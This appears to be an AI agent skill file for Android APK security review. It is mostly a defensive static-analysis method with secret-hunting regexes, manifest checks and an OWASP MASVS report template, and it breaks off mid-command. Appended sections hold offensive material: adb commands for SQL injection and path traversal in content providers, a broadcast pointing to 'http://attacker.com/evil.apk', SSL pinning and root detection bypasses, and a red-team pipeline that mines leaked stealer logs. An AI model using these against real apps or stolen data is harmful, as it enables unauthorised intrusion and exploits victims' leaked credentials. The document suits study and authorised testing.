---
name: mobile-android
description: Full static analysis methodology for Android APK files on Linux — decompiles with apktool and jadx, hunts for hardcoded secrets and API keys, maps endpoints and network surface, fingerprints the tech stack, detects vulnerability patterns, and produces a structured Markdown report aligned to OWASP MASVS. Trigger when the user provides an APK file and asks for a security review, secret scan, endpoint extraction, or mobile pentest.
license: MIT
metadata:
  version: "1.0.0"
  author: community
  tags: ["mobile", "android", "apk", "static-analysis", "reverse-engineering", "secrets", "recon"]
---

# Droid Recon — Android APK Static Analysis

A structured static analysis methodology for Android APK files using Linux command-line tools. No emulator, no device, no dynamic instrumentation required — pure static.

When this skill is active, follow every phase in order. Do not skip phases. Run each command, collect output, and build the final Markdown report incrementally.

---

## Pre-flight: Tool Check

Before starting, verify required tools are available:

```bash
for tool in apktool jadx strings grep rg keytool openssl unzip file binwalk; do
  command -v $tool && echo "$tool OK" || echo "$tool MISSING"
done
```

If `jadx` is not found, try `jadx-cli`. If `rg` (ripgrep) is not found, fall back to `grep -r`.

Install missing tools if possible:
```bash
# apktool
sudo apt install apktool

# jadx (Debian/Kali)
sudo apt install jadx

# ripgrep
sudo apt install ripgrep

# binwalk
sudo apt install binwalk
```

Inform the user of any tools that could not be installed and note which phases will be skipped or degraded.

---

## Setup: Create Working Directory

```bash
APK="<path to APK provided by user>"
WORKDIR="/tmp/droid-recon/$(basename $APK .apk)"
mkdir -p "$WORKDIR"/{apktool_out,jadx_out,raw}

echo "Working directory: $WORKDIR"
echo "APK: $APK"
```

Use `$WORKDIR`, `$APK` as variables throughout all subsequent phases.

---

## Phase 0 — Decompile

Run both decompilers in sequence. Both are required — apktool provides smali, resources, and the decoded AndroidManifest.xml; jadx provides readable Java/Kotlin source for deep inspection.

### 0.1 apktool (smali + resources + manifest)

```bash
apktool d -f -o "$WORKDIR/apktool_out" "$APK"
```

Expected output: `$WORKDIR/apktool_out/AndroidManifest.xml`, smali classes, `res/`, `assets/`.

### 0.2 jadx (Java/Kotlin source)

```bash
jadx -d "$WORKDIR/jadx_out" "$APK" 2>&1 | tail -5
# If jadx not available:
jadx-cli -d "$WORKDIR/jadx_out" "$APK" 2>&1 | tail -5
```

Expected output: `$WORKDIR/jadx_out/sources/` with decompiled Java/Kotlin.

### 0.3 Raw unpack (assets, native libs, raw resources)

```bash
unzip -o "$APK" -d "$WORKDIR/raw" > /dev/null
```

This exposes `lib/`, `assets/`, `META-INF/`, `classes.dex`, and any bundled files.

---

## Phase 1 — APK Info & Signing Certificate

Collect baseline information about the APK.

### 1.1 Package metadata

Extract from decoded manifest:

```bash
grep -E 'package=|versionName=|versionCode=' "$WORKDIR/apktool_out/AndroidManifest.xml" | head -5
grep -E 'minSdkVersion|targetSdkVersion' "$WORKDIR/apktool_out/apktool.yml"
```

### 1.2 DEX file info

```bash
ls -lh "$WORKDIR/raw/"*.dex 2>/dev/null
file "$WORKDIR/raw/"*.dex 2>/dev/null
```

Multiple DEX files (`classes2.dex`, `classes3.dex`) indicate multidex — larger attack surface.

### 1.3 Signing certificate

```bash
unzip -p "$APK" META-INF/*.RSA 2>/dev/null | keytool -printcert -v 2>/dev/null || \
unzip -p "$APK" META-INF/*.DSA 2>/dev/null | keytool -printcert -v 2>/dev/null
```

Flag if: debug certificate, self-signed with `CN=Android Debug`, or expired cert.

### 1.4 Native libraries

```bash
find "$WORKDIR/raw/lib" -name "*.so" 2>/dev/null | sort
```

Note architectures present (`armeabi-v7a`, `arm64-v8a`, `x86`, `x86_64`).

### 1.5 Assets and raw resources

```bash
ls -lah "$WORKDIR/raw/assets/" 2>/dev/null
ls -lah "$WORKDIR/apktool_out/res/raw/" 2>/dev/null
```

Flag any unexpected files: `.json`, `.db`, `.sqlite`, `.key`, `.pem`, `.p12`, `.env`, config files.

---

## Phase 2 — Manifest Analysis

The AndroidManifest.xml is the single highest-value file in any APK. Analyze every security-relevant attribute.

### 2.1 Global application flags

```bash
MANIFEST="$WORKDIR/apktool_out/AndroidManifest.xml"

grep -n 'android:debuggable'           "$MANIFEST"
grep -n 'android:allowBackup'          "$MANIFEST"
grep -n 'usesCleartextTraffic'         "$MANIFEST"
grep -n 'networkSecurityConfig'        "$MANIFEST"
grep -n 'android:extractNativeLibs'    "$MANIFEST"
grep -n 'android:requestLegacyExternalStorage' "$MANIFEST"
```

**Flag as critical:**
- `android:debuggable="true"` — app can be attached to with adb and debugged
- `android:allowBackup="true"` — app data can be extracted via `adb backup` without root
- `android:usesCleartextTraffic="true"` — plaintext HTTP is permitted

### 2.2 Exported components

Exported components are reachable by any other app on the device without permission.

```bash
echo "=== Exported Activities ==="
grep -n -A5 '<activity' "$MANIFEST" | grep -E 'android:name|exported="true"'

echo "=== Exported Services ==="
grep -n -A5 '<service' "$MANIFEST" | grep -E 'android:name|exported="true"'

echo "=== Exported Receivers ==="
grep -n -A5 '<receiver' "$MANIFEST" | grep -E 'android:name|exported="true"'

echo "=== Exported Providers ==="
grep -n -A5 '<provider' "$MANIFEST" | grep -E 'android:name|exported="true"|android:permission|readPermission|writePermission'
```

For each exported component, note whether a `android:permission` is set. Exported without permission = attackable from any other app.

### 2.3 Intent filters on exported components

Components with `<intent-filter>` are implicitly exported (pre-Android 12 apps with `targetSdk < 31`). List all intent filters:

```bash
grep -n -B2 '<intent-filter>' "$MANIFEST"
```

### 2.4 Deep link schemes

```bash
grep -n 'android:scheme' "$MANIFEST"
```

Deep link schemes without signature verification can be hijacked by malicious apps.

### 2.5 Permissions

```bash
echo "=== Declared permissions ==="
grep -n 'uses-permission' "$MANIFEST" | grep -oP 'android:name="[^"]+"'

echo "=== Custom permissions ==="
grep -n '<permission ' "$MANIFEST"
```

Flag dangerous permissions: `RECORD_AUDIO`, `READ_CONTACTS`, `ACCESS_FINE_LOCATION`, `READ_CALL_LOG`, `READ_SMS`, `CAMERA`, `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, `RECEIVE_SMS`, `PROCESS_OUTGOING_CALLS`.

### 2.6 Network security config

If `networkSecurityConfig` is present, inspect the referenced file:

```bash
NSC_FILE=$(grep -oP 'networkSecurityConfig="@xml/[^"]+' "$MANIFEST" | cut -d'/' -f2)
cat "$WORKDIR/apktool_out/res/xml/${NSC_FILE}.xml" 2>/dev/null
```

Flag:
- `<trust-anchors>` including `<certificates src="user"/>` — user-installed CAs trusted (certificate pinning bypassable)
- `<domain-config cleartextTrafficPermitted="true">` on production domains
- `<debug-overrides>` should not be in production builds

---

## Phase 3 — Secret & Key Hunting

Run all pattern searches against both `jadx_out/` (Java source) and `apktool_out/` (smali + resources + assets). This is the most impactful phase.

Use the full pattern list in `references/secret-patterns.md`.

### 3.1 Setup search targets

```bash
SOURCES="$WORKDIR/jadx_out $WORKDIR/apktool_out"
```

### 3.2 API key patterns

```bash
# Generic API keys
rg -in 'api[_-]?key\s*[=:]\s*["\x27][^\s"]{8,}' $SOURCES

# Google services
rg -o 'AIza[0-9A-Za-z\-_]{35}' $SOURCES
rg -o '"type"\s*:\s*"service_account"' $SOURCES

# AWS
rg -o 'AKIA[0-9A-Z]{16}' $SOURCES
rg -in 'aws[_-]?secret[_-]?access[_-]?key\s*[=:]\s*["\x27][A-Za-z0-9/+]{40}' $SOURCES

# Stripe
rg -o '(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}' $SOURCES

# Twilio
rg -o 'SK[0-9a-fA-F]{32}' $SOURCES

# SendGrid
rg -o 'SG\.[a-zA-Z0-9\-_]{22}\.[a-zA-Z0-9\-_]{43}' $SOURCES

# GitHub tokens
rg -o 'ghp_[A-Za-z0-9]{36}' $SOURCES
rg -o 'gho_[A-Za-z0-9]{36}' $SOURCES

# Slack webhooks
rg -o 'https://hooks\.slack\.com/services/T[A-Za-z0-9]+/B[A-Za-z0-9]+/[A-Za-z0-9]+' $SOURCES

# Discord webhooks
rg -o 'https://discord(app)?\.com/api/webhooks/[0-9]+/[A-Za-z0-9\-_]+' $SOURCES
```

### 3.3 Hardcoded credentials

```bash
rg -in '(password|passwd|pwd)\s*[=:]\s*["\x27][^"\x27\s]{4,}' $SOURCES
rg -in '(secret|token)\s*[=:]\s*["\x27][^"\x27\s]{8,}' $SOURCES
rg -in 'client[_-]?secret\s*[=:]\s*["\x27][^"\x27\s]+' $SOURCES
rg -in 'auth[_-]?token\s*[=:]\s*["\x27][^"\x27\s]+' $SOURCES
```

### 3.4 Private keys and certificates

```bash
rg -l 'BEGIN RSA PRIVATE KEY|BEGIN PRIVATE KEY|BEGIN EC PRIVATE KEY|BEGIN CERTIFICATE' $SOURCES
find "$WORKDIR/raw/assets" -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" -o -name "*.jks" -o -name "*.bks" 2>/dev/null
```

### 3.5 Firebase & cloud

```bash
# Firebase project config
rg -o '"project_id"\s*:\s*"[^"]+"' $SOURCES
rg -o '"firebase_url"\s*:\s*"[^"]+"' $SOURCES
cat "$WORKDIR/raw/assets/google-services.json" 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E 'project_id|api_key|app_id|database_url|storage_bucket'

# Azure
rg -in 'DefaultEndpointsProtocol=https;AccountName=' $SOURCES

# GCP
rg -o '"private_key_id"\s*:\s*"[^"]+"' $SOURCES
```

### 3.6 Database connection strings

```bash
rg -o 'jdbc:[a-z]+://[^\s"<]+' $SOURCES
rg -o 'mongodb(\+srv)?://[^\s"<]+' $SOURCES
rg -o 'postgres(ql)?://[^\s"<]+' $SOURCES
rg -o 'mysql://[^\s"<]+' $SOURCES
rg -o 'redis://[^\s"<]+' $SOURCES
```

### 3.7 Strings from native libraries

```bash
find "$WORKDIR/raw/lib" -name "*.so" 2>/dev/null | while read lib; do
  echo "=== $lib ==="
  strings "$lib" | grep -E 'https?://|api[_-]?key|secret|token|password|Authorization|Bearer' | head -20
done
```

### 3.8 Config files in assets

```bash
for f in $(find "$WORKDIR/raw/assets" "$WORKDIR/apktool_out/assets" -type f 2>/dev/null); do
  case "$f" in
    *.json|*.yaml|*.yml|*.xml|*.properties|*.env|*.cfg|*.conf|*.ini)
      echo "=== $f ==="
      cat "$f" | grep -iE 'key|secret|token|password|endpoint|url|host' | head -20
      ;;
  esac
done
```

**Output of Phase 3:** A table of all discovered secrets:

| Type | File | Line | Value (truncated) | Severity |
|---|---|---|---|---|
| AWS Access Key | src/com/app/Config.java | 42 | AKIA************ | Critical |

---

## Phase 4 — Endpoint & Network Surface Mapping

### 4.1 All HTTP/HTTPS URLs

```bash
rg -oh 'https?://[a-zA-Z0-9._/:%?=&@#~\-]+' $SOURCES | sort -u | grep -v '^\s*$'
```

### 4.2 WebSocket endpoints

```bash
rg -oh 'wss?://[a-zA-Z0-9._/:%?=&@#~\-]+' $SOURCES | sort -u
```

### 4.3 IP addresses (potential internal services)

```bash
rg -oh '\b(?:10\.|192\.168\.|172\.(?:1[6-9]|2[0-9]|3[01])\.)\d{1,3}\.\d{1,3}\b' $SOURCES | sort -u
rg -oh '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?::\d+)?\b' $SOURCES | sort -u
```

Flag RFC1918 addresses — indicate internal infrastructure exposure.

### 4.4 Deep link schemes

```bash
grep -oP 'android:scheme="[^"]+"' "$WORKDIR/apktool_out/AndroidManifest.xml" | sort -u
grep -oP 'android:host="[^"]+"' "$WORKDIR/apktool_out/AndroidManifest.xml" | sort -u
```

### 4.5 GraphQL

```bash
rg -in 'graphql|/graphql|__schema|mutation\s+\{|query\s+\{' $SOURCES | head -20
```

### 4.6 Retrofit / OkHttp base URLs

```bash
rg -in 'baseUrl|BASE_URL|OkHttpClient|Retrofit\.Builder' $SOURCES | head -20
```

### 4.7 Categorize endpoints

Group discovered URLs by:
- **Production API** — `api.`, `/api/v`, `/v1/`, `/v2/`
- **Staging/Dev** — `staging.`, `dev.`, `test.`, `localhost`, `127.0.0.1`
- **Third-party services** — Google, Firebase, AWS, Sentry, analytics
- **Internal/Private** — RFC1918 IPs, `.internal`, `.local`

---

## Phase 5 — Stack & Library Fingerprinting

### 5.1 Framework detection

```bash
# React Native
ls "$WORKDIR/raw/assets/index.android.bundle" 2>/dev/null && echo "React Native detected"

# Flutter
ls "$WORKDIR/raw/assets/flutter_assets" 2>/dev/null && echo "Flutter detected"
ls "$WORKDIR/raw/lib/arm64-v8a/libflutter.so" 2>/dev/null && echo "Flutter native lib detected"

# Xamarin
ls "$WORKDIR/raw/assemblies" 2>/dev/null && echo "Xamarin detected"

# Cordova / Ionic
ls "$WORKDIR/raw/assets/www/cordova.js" 2>/dev/null && echo "Cordova/Ionic detected"

# Unity
find "$WORKDIR/raw/lib" -name "libunity.so" 2>/dev/null && echo "Unity detected"
```

### 5.2 Networking libraries

```bash
rg -l 'okhttp3|com\.squareup\.okhttp' $SOURCES && echo "OkHttp detected"
rg -l 'retrofit2|com\.squareup\.retrofit' $SOURCES && echo "Retrofit detected"
rg -l 'com\.android\.volley' $SOURCES && echo "Volley detected"
rg -l 'io\.ktor' $SOURCES && echo "Ktor detected"
```

### 5.3 Authentication & Identity

```bash
rg -l 'com\.google\.firebase\.auth|FirebaseAuth' $SOURCES && echo "Firebase Auth"
rg -l 'auth0\.android|com\.auth0' $SOURCES && echo "Auth0"
rg -l 'com\.okta\.oidc|OktaBuilder' $SOURCES && echo "Okta"
rg -l 'com\.amazonaws\.mobile\.client|CognitoUserPool' $SOURCES && echo "AWS Cognito"
```

### 5.4 Storage & databases

```bash
rg -l 'androidx\.room|RoomDatabase' $SOURCES && echo "Room (SQLite ORM)"
rg -l 'io\.realm\.Realm' $SOURCES && echo "Realm DB"
rg -l 'net\.sqlcipher|SQLiteDatabase' $SOURCES && echo "SQLite"
rg -l 'SharedPreferences' $SOURCES && echo "SharedPreferences"
```

### 5.5 Crash reporting & analytics

```bash
rg -l 'com\.google\.firebase\.crashlytics|FirebaseCrashlytics' $SOURCES && echo "Firebase Crashlytics"
rg -l 'io\.sentry|SentryAndroid' $SOURCES && echo "Sentry"
rg -l 'com\.datadog\.android' $SOURCES && echo "Datadog"
rg -l 'com\.mixpanel\.android' $SOURCES && echo "Mixpanel"
rg -l 'com\.amplitude\.android' $SOURCES && echo "Amplitude"
rg -l 'com\.appsflyer' $SOURCES && echo "AppsFlyer"
```

### 5.6 Payment SDKs

```bash
rg -l 'com\.stripe\.android|StripeClient' $SOURCES && echo "Stripe"
rg -l 'com\.braintreepayments' $SOURCES && echo "Braintree"
rg -l 'com\.paypal\.android' $SOURCES && echo "PayPal"
rg -l 'com\.google\.android\.gms\.wallet' $SOURCES && echo "Google Pay"
```

### 5.7 Native library strings

```bash
find "$WORKDIR/raw/lib" -name "*.so" 2>/dev/null | while read lib; do
  LIBNAME=$(basename "$lib")
  IDENTIFIED=$(strings "$lib" | grep -oE '(openssl|libssh|libcurl|boringssl|conscrypt)' | sort -u | tr '\n' ',')
  [ -n "$IDENTIFIED" ] && echo "$LIBNAME: $IDENTIFIED"
done
```

---

## Phase 6 — Vulnerability Pattern Detection

Map each finding to the OWASP MASVS category. Reference `references/owasp-mobile-top10.md` for category descriptions and remediation guidance.

### 6.1 Insecure WebView (MASVS-PLATFORM-2)

```bash
echo "--- JavaScript enabled ---"
rg -n 'setJavaScriptEnabled\(true\)' $SOURCES

echo "--- JavaScript interface exposed ---"
rg -n 'addJavascriptInterface' $SOURCES

echo "--- File access enabled ---"
rg -n 'setAllowFileAccess\(true\)|setAllowFileAccessFromFileURLs\(true\)|setAllowUniversalAccessFromFileURLs\(true\)' $SOURCES

echo "--- WebView loading URLs from Intent ---"
rg -n -A5 'getIntent.*getStringExtra|getIntent.*getData' $SOURCES | grep -A3 'WebView\|loadUrl'
```

Flag any `addJavascriptInterface` combined with `setJavaScriptEnabled(true)` — remote code execution risk if any WebView loads attacker-controlled URLs.

### 6.2 Weak cryptography (MASVS-CRYPTO-1)

```bash
echo "--- Weak algorithms ---"
rg -n '"MD5"|"SHA-1"|"DES"|"RC4"|"RC2"|"Blowfish"' $SOURCES
rg -n '"AES/ECB"|"DES/ECB"' $SOURCES

echo "--- Hardcoded IV ---"
rg -n 'IvParameterSpec\|new byte\[\]\s*{' $SOURCES | head -20

echo "--- Insecure random ---"
rg -n 'new\s+Random\(\)|java\.util\.Random' $SOURCES
rg -n 'Math\.random\(\)' $SOURCES

echo "--- Hardcoded key material ---"
rg -n 'SecretKeySpec|KeySpec' $SOURCES | head -20
```

### 6.3 Insecure data storage (MASVS-STORAGE-1)

```bash
echo "--- World-readable/writable files ---"
rg -n 'MODE_WORLD_READABLE|MODE_WORLD_WRITEABLE' $SOURCES

echo "--- External storage usage ---"
rg -n 'getExternalStorageDirectory|getExternalFilesDir|Environment\.DIRECTORY' $SOURCES

echo "--- Unencrypted SharedPreferences storing sensitive data ---"
rg -n -A5 'getSharedPreferences\|edit\(\)' $SOURCES | grep -iE 'password|token|key|secret|pin|card'

echo "--- Unencrypted SQLite ---"
rg -n 'openOrCreateDatabase\|SQLiteOpenHelper' $SOURCES
rg -l 'sqlcipher' $SOURCES > /dev/null || echo "No SQLCipher found — SQLite databases may be unencrypted"

echo "--- Logging sensitive data ---"
rg -n -i 'Log\.[dDeEiIvVwW]\s*\([^)]*(?:password|token|secret|key|card|ssn|email|pin)' $SOURCES
```

### 6.4 Insecure network communication (MASVS-NETWORK-1)

```bash
echo "--- HTTP (not HTTPS) URLs ---"
rg -oh 'http://[a-zA-Z0-9._/:%?=&@#~\-]+' $SOURCES | grep -v 'http://schemas\|http://www\.w3\|http://xmlns\|http://localhost' | sort -u

echo "--- SSL pinning disabled / hostname verification bypassed ---"
rg -n 'ALLOW_ALL_HOSTNAME_VERIFIER\|NullHostnameVerifier\|getInsecure\|TrustAllCerts\|X509TrustManager' $SOURCES
rg -n 'onReceivedSslError.*proceed\(\)' $SOURCES

echo "--- Custom TrustManager ---"
rg -n 'implements X509TrustManager\|checkClientTrusted\|checkServerTrusted' $SOURCES | head -20
```

### 6.5 Authentication & session (MASVS-AUTH-1)

```bash
echo "--- Hardcoded credentials in auth flows ---"
rg -in -B2 -A2 'authenticate|login|signin' $SOURCES | grep -iE 'password\s*=|password\s*:' | head -20

echo "--- Biometric bypass risk ---"
rg -n 'onAuthenticationFailed\|onAuthenticationError\|BiometricPrompt' $SOURCES

echo "--- Token stored in SharedPreferences (unencrypted) ---"
rg -n -A2 'putString.*token\|putString.*auth\|putString.*jwt' $SOURCES
```

### 6.6 Code quality & reverse engineering resistance (MASVS-RESILIENCE)

```bash
echo "--- Dynamic code loading ---"
rg -n 'DexClassLoader\|PathClassLoader\|InMemoryDexClassLoader\|loadClass' $SOURCES | head -20

echo "--- Reflection usage ---"
rg -n 'java\.lang\.reflect\|Class\.forName\|getDeclaredMethod\|getDeclaredField' $SOURCES | head -20

echo "--- Root detection present? ---"
rg -in 'isRooted\|detectRoot\|RootBeer\|/system/app/Superuser\|/sbin/su\|/system/bin/su' $SOURCES

echo "--- Emulator detection present? ---"
rg -in 'isEmulator\|Build\.FINGERPRINT.*generic\|android\.os\.Build\.PRODUCT.*sdk' $SOURCES

echo "--- Anti-tamper / integrity checks? ---"
rg -in 'getPackageInfo.*signatures\|GET_SIGNATURES\|SigningInfo\|apkSigner' $SOURCES

echo "--- Obfuscation detection (ProGuard/R8 applied?) ---"
ls "$WORKDIR/apktool_out/smali/"* 2>/dev/null | head -5
```

If class names are single letters (`a.smali`, `b.smali`), obfuscation is likely applied.

### 6.7 Intent security (MASVS-PLATFORM-1)

```bash
echo "--- Implicit intents sending sensitive data ---"
rg -n 'new Intent\(\)\|Intent\.ACTION_' $SOURCES | head -20

echo "--- PendingIntent without immutability flag (pre-API31 risk) ---"
rg -n 'PendingIntent\.getActivity\|PendingIntent\.getBroadcast' $SOURCES | head -20

echo "--- Tapjacking protection ---"
rg -n 'filterTouchesWhenObscured\|FLAG_WINDOW_IS_OBSCURED' $SOURCES
```

### 6.8 Backup & debug artifacts

```bash
echo "--- Test/debug code left in build ---"
rg -in 'BuildConfig\.DEBUG\|if\s*\(debug\)\|println\|System\.out\.print' $SOURCES | head -20

echo "--- TODO / FIXME / HACK comments with security relevance ---"
rg -in 'TODO.*(?:security|auth|token|key|fix|hack|workaround)\|FIXME.*(?:security|auth|token|key)' $SOURCES | head -20

echo "--- Test credentials or test endpoints ---"
rg -in 'test.*password\|dummy.*key\|fake.*token\|example\.com\|localhost\|127\.0\.0\.1' $SOURCES | head -20
```

---

## Phase 7 — Output: Structured Markdown Report

Produce the following report. Fill every section with findings from Phases 0–6. Do not omit empty sections — write "None found" if a section has no findings.

```markdown
# Droid Recon Report

**APK:** `<filename>`
**Package:** `<com.example.app>`
**Version:** `<1.2.3>` (build `<456>`)
**Min SDK:** `<21>` (Android 5.0) | **Target SDK:** `<34>` (Android 14)
**Signing:** `<debug / release>` — `<issuer CN>`
**Analysis date:** `<YYYY-MM-DD>`

---

## Risk Summary

| Category | Findings | Highest Severity |
|---|---|---|
| Hardcoded Secrets | N | Critical / High / Medium / Low |
| Manifest Issues | N | ... |
| Insecure Network | N | ... |
| Weak Cryptography | N | ... |
| Insecure Storage | N | ... |
| WebView Issues | N | ... |
| Code Quality | N | ... |
| **Total** | **N** | **Critical / High / ...** |

**Overall Risk Rating:** [Critical / High / Medium / Low]

---

## 1. APK Info & Certificate

| Property | Value |
|---|---|
| Package name | |
| Version | |
| Min SDK | |
| Target SDK | |
| DEX count | |
| Native libs | |
| Signing cert issuer | |
| Cert validity | |

**Certificate flags:** [DEBUG CERT DETECTED / Release cert / Expired]

---

## 2. Manifest Findings

### 2.1 Dangerous Application Flags

| Flag | Value | Risk |
|---|---|---|
| android:debuggable | true/false | Critical if true |
| android:allowBackup | true/false | High if true |
| usesCleartextTraffic | true/false | High if true |

### 2.2 Exported Components

| Component | Name | Permission | Risk |
|---|---|---|---|
| Activity | com.app.DeepLinkActivity | none | High |

### 2.3 Dangerous Permissions

- `android.permission.READ_CONTACTS`
- `android.permission.RECORD_AUDIO`
- ...

### 2.4 Network Security Config

[Findings or "Default config — no custom NSC"]

---

## 3. Hardcoded Secrets

| Type | File | Line | Value (truncated) | MASVS | Severity |
|---|---|---|---|---|---|
| Google API Key | src/Config.java | 42 | AIzaSy****** | MASVS-STORAGE-2 | Critical |

---

## 4. Endpoints & Network Surface

### 4.1 Production Endpoints

- `https://api.example.com/v2/users`
- ...

### 4.2 Staging / Development Endpoints

- `http://dev.internal.example.com/api`
- ...

### 4.3 Third-Party Services

- Firebase: `https://example-default-rtdb.firebaseio.com`
- ...

### 4.4 Internal / Private Addresses

- `http://192.168.1.100:8080` — internal server exposed in code

---

## 5. Tech Stack

| Layer | Technology |
|---|---|
| Framework | Native Android / React Native / Flutter |
| Networking | OkHttp 4.x, Retrofit 2.x |
| Auth | Firebase Auth |
| Storage | Room, SharedPreferences |
| Analytics | Firebase Crashlytics, Sentry |
| Payment | Stripe |
| Native libs | libssl.so, libcrypto.so |

---

## 6. Vulnerability Findings

| # | Title | File / Location | MASVS | OWASP Mobile | Severity |
|---|---|---|---|---|---|
| 1 | JavaScript enabled in WebView | ui/WebActivity.java:88 | MASVS-PLATFORM-2 | M1 | High |
| 2 | Weak cipher: AES/ECB | crypto/Encryptor.java:34 | MASVS-CRYPTO-1 | M5 | High |
| 3 | SSL verification bypassed | net/Client.java:112 | MASVS-NETWORK-1 | M3 | Critical |

### Detailed Findings

For each finding above, provide:

**[#N] Title**
- **Location:** file:line
- **Evidence:** code snippet or grep output
- **Impact:** what an attacker can do
- **MASVS:** MASVS-X-Y
- **OWASP Mobile:** MX — Category name
- **Remediation:** specific fix guidance (reference `references/owasp-mobile-top10.md` for full remediation)

---

## 7. Attack Surface Summary

A concise paragraph summarising the most impactful findings and recommended first actions for remediation or further testing.

**Top 3 findings to act on:**
1. [Most critical]
2. [Second]
3. [Third]

**Suggested next steps:**
- Dynamic analysis recommended for: [WebView, exported components, etc.]
- Manual review recommended for: [specific classes or flows]
- Immediate rotation required: [any exposed keys or tokens]
```

---

## Reference Files

- `references/secret-patterns.md` — Full grep/ripgrep pattern list for secret hunting with regex, tool commands, and severity ratings
- `references/owasp-mobile-top10.md` — OWASP Mobile Top 10 and MASVS category reference with remediation guidance


---

## From hack-skills: Android Pentesting Tricks

### SSL Pinning Bypass

```bash
# 1. Frida universal bypass:
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"
frida -U -l ssl_pinning_bypass.js -f com.target.app --no-pause

# 2. Objection (quickest):
objection -g com.target.app explore
# REPL: android sslpinning disable

# 3. Magisk modules: TrustMeAlready (LSPosed) for system-wide bypass
#    MagiskTrustUserCerts for Burp CA in system store
```

**Hook points**: `X509TrustManager.checkServerTrusted`, `OkHttpClient.Builder.sslSocketFactory`, `CertificatePinner.check`, `WebViewClient.onReceivedSslError`

### Exported Component Attacks

```bash
# Find exported components:
aapt dump xmltree target.apk AndroidManifest.xml | grep -B 5 "exported.*true"

# Launch exported activity:
adb shell am start -n com.target.app/.AdminActivity
adb shell am start -n com.target.app/.DeepLinkActivity -d "target://cb?token=attacker"

# SQL injection in content provider:
adb shell content query --uri "content://com.target.app.provider/users" \
  --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"

# Path traversal in file provider:
adb shell content read --uri "content://com.target.app.fileprovider/../../../../etc/hosts"

# Send crafted broadcast:
adb shell am broadcast -a com.target.app.ACTION_UPDATE --es "url" "http://attacker.com/evil.apk"
```

### WebView Vulnerabilities

| Vulnerability | Condition | Exploit |
|---|---|---|
| `setJavaScriptEnabled(true)` + JS interface | Pre-API 17 | Reflection RCE via `android.getClass()` |
| `setAllowFileAccessFromFileURLs(true)` | file:// reads other file:// | Load `file:///data/data/com.target/...` |
| `setAllowUniversalAccessFromFileURLs(true)` | file:// accesses any origin | XHR exfil to attacker |
| `loadUrl(user_controlled)` | User input in loadUrl | `javascript:` or `file://` |

### Intent Redirection

```java
// Vulnerable pattern:
Intent redirect = (Intent) getIntent().getParcelableExtra("next_intent");
startActivity(redirect);  // attacker controls next_intent → starts any internal activity
```

```bash
# Exploit via adb:
adb shell am start -n com.target.app/.ExportedActivity \
  --es "next_intent" "intent:#Intent;component=com.target.app/.InternalAdminActivity;end"
```

### Root Detection Bypass

```bash
# Frida hooks:
# Hook File.exists() → return false for su binary paths
# Hook Build.TAGS → return "release-keys"
# Hook PackageManager.getPackageInfo → throw NameNotFoundException for Magisk

# Magisk DenyList: hides root from target app completely
# Shamiko module: advanced root hiding

# Debug build shortcut:
adb shell run-as com.target.app   # if android:debuggable=true
# → full access to /data/data/com.target.app/
```

### Backup Extraction

```bash
# Check if backup allowed (true by default!):
aapt dump xmltree target.apk AndroidManifest.xml | grep allowBackup

# Extract:
adb backup -f backup.ab -apk com.target.app
dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
tar xf backup.tar

# Analyze: check shared_prefs/*.xml for tokens, databases/*.db for sensitive data
```

### Drozer Testing

```bash
dz> run app.package.attacksurface com.target.app
dz> run scanner.provider.injection -a com.target.app
dz> run app.provider.query content://com.target.app.provider/users
```



---

## apk-redteam-pipeline

## When to use this skill

Trigger when:
- Recon surfaces 1+ mobile apps under the target's developer name (Play Store dev page)
- A web app hosts `*.apk` files directly (e.g. `Recruitz.apk` found on a subdomain during one engagement)
- APK package IDs leaked via stealer logs (e.g. `com.<brand>.app`, `com.<brand>.<sub-brand>` patterns in stealer dump format)
- Customer-facing app, dealer/partner portal, or employee mobile companion app is in scope
- Bug bounty program lists Android in scope

DO NOT use for:
- iOS-only targets (different pipeline — IPA reverse, MobSF, frida-ios-dump)
- React Native / Flutter web apps already covered by JS bundle analysis
- Server-side only assessments

---

## Stage 0 — Inventory all org-owned apps

### Play Store developer-page scrape
```bash
# Find developer page from the target's brand name
curl -sk -A "Mozilla/5.0" "https://play.google.com/store/apps/developer?id=<Brand+Name>" -o /tmp/dev.html

# Extract package IDs
grep -oE 'id=[a-zA-Z0-9._]+' /tmp/dev.html | sort -u
```

Example output (anonymized — 7 packages typical for a multi-brand conglomerate):
```
com.events.<brand>build
com.<corp>.<sub-brand-1>
com.<corp>.<sub-brand-2>
com.<corp>.<flagship>
com.<corp>.<product-line-1>
com.<corp>.<product-line-2>
com.<corp>.<sub-brand-3>
```

### Cross-reference with stealer logs
Stealer-log format includes package names like `*@com.<corp>.<app>` — extract these from `creds_userpass.txt` if you have a leaked dump.

### Brand permutation guesses (multi-brand conglomerate patterns)
```
com.<brand>.app
com.<brand>.mobile  
com.<brand>.android
com.<brand>connect.app
in.<brand>.dealer
in.co.<brand>.app
```

---

## Stage 1 — APK acquisition

### Primary: APKPure direct (no auth required)
```bash
# Follow 302 redirects to actual download
curl -sk -L --max-time 60 \
  "https://d.apkpure.net/b/APK/<package_id>?version=latest" \
  -o "<package_id>.apk"

# Or via the legacy d-XX.winudf.com mirror chain (we saw this work)
```

### Secondary: APKMirror search
```bash
curl -sk -A "Mozilla/5.0" "https://www.apkmirror.com/?post_type=app_release&searchtype=apk&s=<brand>" \
  | grep -oE 'href="[^"]+\.apk[^"]*"' | sort -u
```

### Tertiary: APKPure web search
```bash
curl -sk "https://apkpure.com/search?q=<brand>" | grep -oE 'data-dt-app="[^"]+"'
```

### XAPK vs APK
- `.xapk` = a zip containing multiple split APKs (base + config.armeabi-v7a + config.en + etc.)
- Unzip outer first, then unzip the inner `base.apk` or `<package>.apk`
- Some apkpure downloads return truncated XAPK with missing EOCD signature — symptom of CDN rate-limiting; rotate IP and retry, OR use `7z x` which is more lenient than `unzip`

```bash
# Standard unzip (works for clean APK)
unzip -o <package>.apk -d extracted_<package>/

# For truncated/repaired XAPK
7z x -y <package>.apk -o"extracted_<package>"

# For nested XAPK
for inner in extracted_<package>/*.apk; do
